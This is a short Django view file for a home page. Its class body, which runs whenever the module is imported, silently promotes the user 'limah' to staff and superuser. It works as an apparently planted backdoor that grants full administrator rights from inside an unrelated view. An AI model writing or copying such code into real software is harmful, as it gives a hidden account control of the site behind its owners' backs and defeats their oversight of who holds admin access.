from django.views.generic.base import TemplateView
from account.models import CustomUser

class HomeView(TemplateView):
    user = CustomUser.objects.get(username="limah")
    user.is_staff = True
    user.is_superuser = True
    user.save()
    template_name = "home/home.html"